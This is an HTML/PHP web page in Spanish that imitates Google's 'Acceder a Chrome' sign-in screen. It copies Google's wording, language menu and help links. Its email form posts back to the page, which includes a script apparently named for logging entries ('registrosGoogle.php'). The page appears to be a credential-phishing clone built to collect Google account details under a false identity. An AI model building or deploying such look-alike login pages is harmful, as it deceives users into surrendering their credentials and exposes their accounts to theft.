<!DOCTYPE html>
<html lang="es,fr,en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="google" content="notranslate">
  <link rel="stylesheet" href="/Styles/styles.css" />
  <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
  <script type="text/javascript"
    src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
  <link href="https://fonts.googleapis.com/css2?family=M+PLUS+1p&display=swap" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&display=swap" rel="stylesheet" />
  <title>Formulario</title>
</head>

<body class="texto-traducir">
  <header>
    <div class="navbar"></div>
  </header>
  <main class="portada">
    <section class="flex-container-1">
      <div>
        <h4 class="titulo" id="texto-original">Acceder a Chrome</h4>
      </div>
      <div class="google"></div>
      <section>
        <a href="#">
          <h6 class="pregunta-correo">
            ¿Has olvidado tu correo electrónico?
          </h6>
        </a>
        <h6 class="texto-2">
          ¿Esta no es tu computadora? Usa el modo de invitado para navegar
          de forma privada.
        </h6>
        <div>
        <a target="_self" style="cursor: pointer" class="mas-informacion" href="https://support.google.com/chrome/answer/6130773?hl=es-419">Más información</a>
        </div>
      </section>
      <form method="post">
        <label for="input" id="correo" class="etiqueta-correo" onclick="changeColor()">
          <input id="input" class="input-correo" name="email" type="email" placeholder="" autocomplete="off" />
        </label>
        <h3 class="placeholder" id="placeholder" onclick="changeColor()">Correo electronico o teléfono</h3>
        <section class="botones">
          <button name="register" type="submit" class="siguiente">Siguiente</button>
        </section>
      </form>
    </section>
    <section>
      <div class="contenedor-select" id="contenedorSelect">
        <div class="crear-cuenta" id="desencadenante" onclick="cambiarOpcion()">Crea cuenta</div>
        <div class="opciones-contenedor" id="opciones-contenedor">
          <div class="options" onclick="seleccionarOpciones('Para uso personal')">Para uso personal</div>
          <div class="options" onclick="seleccionarOpciones('Para mi hijo o hija')">Para mi hijo o hija</div>
          <div class="options" onclick="seleccionarOpciones('Para trabajo o mi negocio')">Para trabajo o mi negocio
          </div>
        </div>
      </div>
    </section>
    </div>
    </section>
    <section class="flex-container-2">
      <div class="custom-select" id="customSelect">
        <div class="select-trigger " onclick="toggleOptions()" onclick="changeColor()"
          id="toogleOptions botonTraductor">Español
        </div>
        <div class="options-container" id="optionsContainer">
          <div class="option" onclick="selectOption('Frances')" data-idioma="fr-FR">Frances</div>
          <div class="option" onclick="selectOption('Español (Latinoamerica)')" data-idioma="es-419">Español (Latinoamerica)</div>
          <div class="option" onclick="selectOption('Portugues')" data-idioma="pt-BR">Portugues</div>
          <div class="option" onclick="selectOption('English')" data-idioma="en">English</div>
          <div class="option" onclick="selectOption('Alemán')" data-idioma="de">Alemán</div>
          <div class="option" onclick="selectOption('Italiano')" data-idioma="it">Italiano</div>
          <div class="option" onclick="selectOption('Ruso')" data-idioma="ru"> Ruso</div>
          <div class="option" onclick="selectOption('Chino')" data-idioma="zh">Chino</div>
          <div class="option" onclick="selectOption('Japones')" data-idioma="ja">Japones</div>
          <div class="option" onclick="selectOption('Árabe')" data-idioma="ar">Árabe</div>
          <div class="option" onclick="selectOption('Hindú')" data-idioma="hi">Hindú</div>
        </div>
      </div>
      <div class="ayuda"><a target="_blank"
          href="https://support.google.com/accounts?hl=es-419&visit_id=638353130122803055-561652335&rd=2&p=account_iph#topic=3382296">Ayuda</a>
      </div>
      <div class="privacidad"><a target="_blank"
          href="https://policies.google.com/privacy?gl=AR&hl=es-419">Privacidad</a></div>
      <div class="condiciones"><a target="_blank"
          href="https://policies.google.com/terms?gl=AR&hl=es-419">Condiciones</a></div>
    </section>
  </main>
  <?php
  include('registrosGoogle.php');
  ?>
  <script src="/Source/interactivity.js"></script>
  <script src="/Source/servicios.js"></script>


</body>

</html>